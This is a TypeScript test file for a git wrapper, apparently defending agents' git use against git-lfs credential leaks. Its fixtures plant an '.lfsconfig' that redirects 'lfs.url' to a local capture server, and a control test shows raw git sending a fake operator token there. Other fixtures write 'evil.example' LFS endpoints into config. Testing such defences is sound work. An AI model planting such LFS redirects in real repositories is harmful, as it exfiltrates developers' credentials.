/**
 * T16 round 4 (HIGH-3 and MED-6): git-lfs and credentials.
 *
 * A `.lfsconfig` that arrives DURING a checkout / worktree add / merge names an `lfs.url`, and git-lfs's smudge filter
 * would send the operator's credentials there. Every checkout-type command now runs with GIT_LFS_SKIP_SMUDGE=1, and
 * `lfs.url` / `lfs.pushurl` / `lfs.locksurl` are forced on the command line (they beat `.lfsconfig`) to the endpoint of
 * the repository's own remote or to the operator's own. Hooks are off, so `git lfs push` never runs: pushing a
 * repository that tracks LFS files is refused loudly instead of sending pointers without their objects.
 */
import assert from "node:assert/strict";
import { execFile, execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { type Server, createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, test } from "node:test";
import { promisify } from "node:util";
import { forgetRemotePinsForTests, safeGit, stateHooks } from "../../src/git/safeGit.ts";

const hasLfs = (() => {
  try {
    execFileSync("git", ["lfs", "version"], { stdio: "pipe" });
    return true;
  } catch {
    return false;
  }
})();

let root = "";
let server: Server | undefined;
let seen: string[] = [];
const prior: Record<string, string | undefined> = {};
const KEYS = ["HOME", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_NOSYSTEM"];

async function startServer(): Promise<number> {
  seen = [];
  server = createServer((req, res) => {
    const a = req.headers.authorization;
    seen.push(
      `${req.method} ${req.url} auth=${a ? `PRESENT:${Buffer.from(a.split(" ")[1] ?? "", "base64").toString()}` : "none"}`,
    );
    if (!a) {
      res.writeHead(401, { "WWW-Authenticate": 'Basic realm="x"' });
      res.end();
    } else {
      res.writeHead(404);
      res.end("{}");
    }
  });
  await new Promise<void>((r) => server?.listen(0, "127.0.0.1", r));
  return (server?.address() as { port: number }).port;
}

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "safe-git-lfs-"));
  stateHooks.stateRoot = join(root, "state");
  for (const k of KEYS) prior[k] = process.env[k];
  mkdirSync(join(root, "home"));
  writeFileSync(
    join(root, "operator.gitconfig"),
    `[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n\trequired = true\n[user]\n\tname = op\n\temail = op@x\n[credential]\n\thelper = "!f() { echo username=operator; echo password=OPERATOR-SECRET-TOKEN; }; f"\n`,
  );
  process.env.HOME = join(root, "home");
  process.env.GIT_CONFIG_GLOBAL = join(root, "operator.gitconfig");
  process.env.GIT_CONFIG_NOSYSTEM = "1";
});
afterEach(async () => {
  for (const k of KEYS) {
    if (prior[k] === undefined) Reflect.deleteProperty(process.env, k);
    else process.env[k] = prior[k];
  }
  stateHooks.stateRoot = undefined;
  forgetRemotePinsForTests();
  await new Promise<void>((r) => (server ? server.close(() => r()) : r()));
  server = undefined;
  rmSync(root, { recursive: true, force: true });
});

const rawEnv = () => ({ ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" });
const sh = (c: string, cwd: string) =>
  execFileSync("bash", ["-c", c], { cwd, env: rawEnv(), stdio: "pipe" }).toString();
// asynchronous: the fake server lives in this process, so a blocking exec would deadlock against it
const operatorSh = (c: string, cwd: string) => promisify(execFile)("bash", ["-c", c], { cwd, env: process.env });

const POINTER = `version https://git-lfs.github.com/spec/v1\\noid sha256:${"ab".repeat(32)}\\nsize 5\\n`;

/** A repository whose `evil` branch carries a `.lfsconfig` (lfs.url = the server) and an LFS pointer whose object is not local. */
function evilRepo(port: number, name: string) {
  const dir = join(root, name);
  mkdirSync(dir);
  sh(
    `git init -q -b main r && cd r && git config user.name t && git config user.email t@t && echo a > a.txt && git add . && git commit -qm one && git remote add origin https://good.invalid/org/repo.git && git checkout -q -b evil && printf '*.bin filter=lfs diff=lfs merge=lfs -text\\n' > .gitattributes && printf '[lfs]\\n\\turl = http://127.0.0.1:${port}/x/info/lfs\\n' > .lfsconfig && printf '${POINTER}' > p.bin && git add -f . && git commit -qm evil --no-verify && git checkout -q main`,
    dir,
  );
  return join(dir, "r");
}

test(
  "control: raw git with the operator's git-lfs checks out the pointer and sends the operator's credentials to lfs.url",
  { skip: !hasLfs },
  async () => {
    const port = await startServer();
    const r = evilRepo(port, "control");
    try {
      await operatorSh("git checkout -f evil", r);
    } catch {
      /* the download fails (404); the request is the point */
    }
    await new Promise((res) => setTimeout(res, 300));
    assert.ok(
      seen.some((s) => /auth=PRESENT:operator:OPERATOR-SECRET-TOKEN/.test(s)),
      `control not live: ${JSON.stringify(seen)}`,
    );
  },
);

const CHECKOUT_CASES: Array<{
  name: string;
  args: (dir: string) => string[];
  cwd?: (r: string, dir: string) => string;
}> = [
  { name: "checkout", args: () => ["checkout", "-f", "evil"] },
  { name: "switch", args: () => ["switch", "-f", "evil"] },
  { name: "worktree add", args: (dir) => ["worktree", "add", join(dir, "wt2"), "evil"] },
  { name: "merge", args: () => ["merge", "--no-edit", "evil"] },
  { name: "reset --hard", args: () => ["reset", "--hard", "evil"] },
  { name: "restore", args: () => ["restore", "--source=evil", "--worktree", "--", "."] },
  { name: "cherry-pick", args: () => ["cherry-pick", "evil"] },
  { name: "rebase", args: () => ["rebase", "evil"] },
  {
    name: "stash apply of a pointer checkout",
    args: () => ["checkout", "evil", "--", "p.bin", ".lfsconfig", ".gitattributes"],
  },
];
for (const c of CHECKOUT_CASES) {
  test(
    `${c.name}: a .lfsconfig that arrives with the checkout sends no credential anywhere (operator mode)`,
    { skip: !hasLfs },
    async () => {
      const port = await startServer();
      const r = evilRepo(port, `case-${c.name.replace(/\W+/g, "_")}`);
      const res = await safeGit(c.args(join(r, "..")), { cwd: r, trust: "operator", timeoutMs: 30_000 });
      await new Promise((x) => setTimeout(x, 400));
      assert.deepEqual(seen, [], `${c.name} (code ${res.code}): ${res.stderr.slice(0, 200)}`);
    },
  );
}

test(
  "clone of a repository with a pointer and a .lfsconfig sends no credential either",
  { skip: !hasLfs },
  async () => {
    const port = await startServer();
    const r = evilRepo(port, "src-clone");
    sh("git checkout -q evil", r);
    const dest = join(root, "clone", "dest");
    mkdirSync(join(root, "clone"));
    const res = await safeGit(["clone", "-q", r, dest], {
      cwd: join(root, "clone"),
      trust: "operator",
      timeoutMs: 30_000,
    });
    await new Promise((x) => setTimeout(x, 400));
    assert.equal(res.code, 0, res.stderr);
    assert.deepEqual(seen, []);
  },
);

test(
  "lfs.url, pushurl and locksurl are forced: derived from the repository's own https remote, the operator's own value wins, a worker's value is not honoured",
  { skip: !hasLfs },
  async () => {
    const dir = join(root, "forced");
    mkdirSync(dir);
    sh("git init -q -b main r && cd r && git remote add origin https://good.example/org/repo.git", dir);
    const r = join(dir, "r");
    // a worker writes lfs endpoints into the shared config: not allow-listed, so not seen
    sh("git config lfs.url https://evil.example/lfs && git config remote.origin.lfsurl https://evil.example/lfs", r);
    const env = await safeGit(["lfs", "env"], { cwd: r, trust: "operator", timeoutMs: 20_000 });
    assert.match(env.stdout, /Endpoint=https:\/\/good\.example\/org\/repo\.git\/info\/lfs/, env.stdout + env.stderr);
    assert.doesNotMatch(env.stdout, /evil\.example/);
    // the operator's own configured endpoint is the operator's choice
    writeFileSync(
      join(root, "operator.gitconfig"),
      `${execFileSync("cat", [join(root, "operator.gitconfig")]).toString()}[lfs]\n\turl = https://corp.example/lfs\n`,
    );
    const own = await safeGit(["lfs", "env"], { cwd: r, trust: "operator", timeoutMs: 20_000 });
    assert.match(own.stdout, /Endpoint=https:\/\/corp\.example\/lfs/, own.stdout + own.stderr);
  },
);

test(
  "an ssh remote derives no endpoint (empty, so git-lfs fails instead of contacting a worker's lfs.url)",
  { skip: !hasLfs },
  async () => {
    const port = await startServer();
    const dir = join(root, "ssh");
    mkdirSync(dir);
    sh(
      `git init -q -b main r && cd r && git remote add origin git@good.example:org/repo.git && printf '[lfs]\\n\\turl = http://127.0.0.1:${port}/x\\n' > .lfsconfig`,
      dir,
    );
    const res = await safeGit(["lfs", "env"], { cwd: join(dir, "r"), trust: "operator", timeoutMs: 20_000 });
    assert.equal(res.code, 128);
    assert.match(res.stderr, /\.lfsconfig/);
    assert.deepEqual(seen, []);
  },
);

// ─── MED-6: push ────────────────────────────────────────────────────────────────────────────────────────────────

function lfsRepo(name: string, attrs: { root?: string; nested?: string; untracked?: boolean }) {
  const dir = join(root, name);
  mkdirSync(dir);
  sh(
    "git init -q -b main r && cd r && git config user.name t && git config user.email t@t && git remote add origin https://example.invalid/org/repo.git && echo a > a.txt && git add . && git commit -qm one",
    dir,
  );
  const r = join(dir, "r");
  if (attrs.root) {
    writeFileSync(join(r, ".gitattributes"), attrs.root);
    if (!attrs.untracked) sh("git add .gitattributes && git commit -qm attrs", r);
  }
  if (attrs.nested) {
    mkdirSync(join(r, "sub"));
    writeFileSync(join(r, "sub", ".gitattributes"), attrs.nested);
    sh("git add sub && git commit -qm sub", r);
  }
  return r;
}

test("push of a repository that tracks LFS files is refused loudly in operator mode (hooks are off: pointers would go without objects)", async () => {
  for (const attrs of [
    { root: "*.bin filter=lfs diff=lfs merge=lfs -text\n" },
    { root: "*.bin filter=lfs -text\n", untracked: true },
    { nested: "*.dat filter=lfs diff=lfs merge=lfs -text\n" },
    { root: '"big file*" filter=lfs\n' },
  ]) {
    const r = lfsRepo(
      `push-${JSON.stringify(attrs).length}-${
        Math.abs(
          JSON.stringify(attrs)
            .split("")
            .reduce((a, c) => a * 31 + c.charCodeAt(0), 7),
        ) % 9973
      }`,
      attrs,
    );
    const res = await safeGit(["push", "origin", "main"], { cwd: r, trust: "operator", timeoutMs: 20_000 });
    assert.equal(res.code, 128, JSON.stringify(attrs));
    assert.match(res.stderr, /tracks files with git-lfs/, JSON.stringify(attrs));
    assert.match(res.stderr, /pointer files without their objects/);
  }
});

test("push is not refused when there is nothing LFS about the repository, when the filter is not lfs, or in strict mode (which has no lfs filter)", async () => {
  const cases: Array<[string, { root?: string }, "strict" | "operator"]> = [
    ["plain", {}, "operator"],
    ["other filter", { root: "*.bin filter=other\n" }, "operator"],
    ["lfs only in a comment", { root: "# *.bin filter=lfs\n" }, "operator"],
    ["strict", { root: "*.bin filter=lfs\n" }, "strict"],
  ];
  for (const [name, attrs, trust] of cases) {
    const r = lfsRepo(`nopush-${name.replace(/\W+/g, "_")}`, attrs);
    const res = await safeGit(["push", "origin", "main"], { cwd: r, trust, timeoutMs: 8_000 });
    assert.doesNotMatch(res.stderr, /git-lfs/, name);
  }
});

// ─── each protection on its own (the server tests above are covered twice over by the two protections) ────────────

test("the forced lfs endpoints reach the command line of every call (git config sees them at command scope)", async () => {
  const dir = join(root, "scope");
  mkdirSync(dir);
  sh("git init -q -b main r && cd r && git remote add origin https://good.example/org/repo.git", dir);
  const r = join(dir, "r");
  const get = async (k: string) => (await safeGit(["config", "--get", k], { cwd: r, trust: "operator" })).stdout.trim();
  assert.equal(await get("lfs.url"), "https://good.example/org/repo.git/info/lfs");
  assert.equal(await get("lfs.pushurl"), "https://good.example/org/repo.git/info/lfs");
  assert.equal(await get("lfs.locksurl"), "https://good.example/org/repo.git/info/lfs/locks");
});

test("checkout-type commands run with GIT_LFS_SKIP_SMUDGE=1; other commands do not (a stand-in smudge filter records it)", async () => {
  const marks = join(root, "smudge-marks");
  mkdirSync(marks);
  const script = join(root, "smudge.sh");
  writeFileSync(script, `#!/bin/sh\necho "skip=\${GIT_LFS_SKIP_SMUDGE:-unset}" > "${marks}/$$"\ncat\n`);
  chmodSync(script, 0o755);
  writeFileSync(
    join(root, "operator.gitconfig"),
    `[filter "lfs"]\n\tsmudge = ${script}\n\tclean = cat\n[user]\n\tname = op\n\temail = op@x\n`,
  );
  const dir = join(root, "smudge");
  mkdirSync(dir);
  sh(
    "git init -q -b main r && cd r && git config user.name t && git config user.email t@t && printf '*.bin filter=lfs\\n' > .gitattributes && echo a > a.bin && git add -f . && git commit -qm one --no-verify && git branch other",
    dir,
  );
  const r = join(dir, "r");
  const seenValues = () => readdirSync(marks).map((n) => readFileSync(join(marks, n), "utf8").trim());
  const run = async (args: string[]) => {
    rmSync(join(r, "a.bin"), { force: true });
    for (const n of readdirSync(marks)) rmSync(join(marks, n));
    await safeGit(args, { cwd: r, trust: "operator", timeoutMs: 20_000 });
    return seenValues();
  };
  for (const args of [
    ["checkout", "-f", "main"],
    ["reset", "--hard", "main"],
    ["restore", "a.bin"],
  ]) {
    const v = await run(args);
    assert.deepEqual([...new Set(v)], ["skip=1"], `${args.join(" ")}: ${JSON.stringify(v)}`);
  }
  // a command that does not write the work tree is left alone (the variable is not set for it)
  for (const n of readdirSync(marks)) rmSync(join(marks, n));
  writeFileSync(join(r, "a.bin"), "changed\n");
  await safeGit(["add", "a.bin"], { cwd: r, trust: "operator" });
  for (const v of seenValues()) assert.notEqual(v, "skip=1");
});
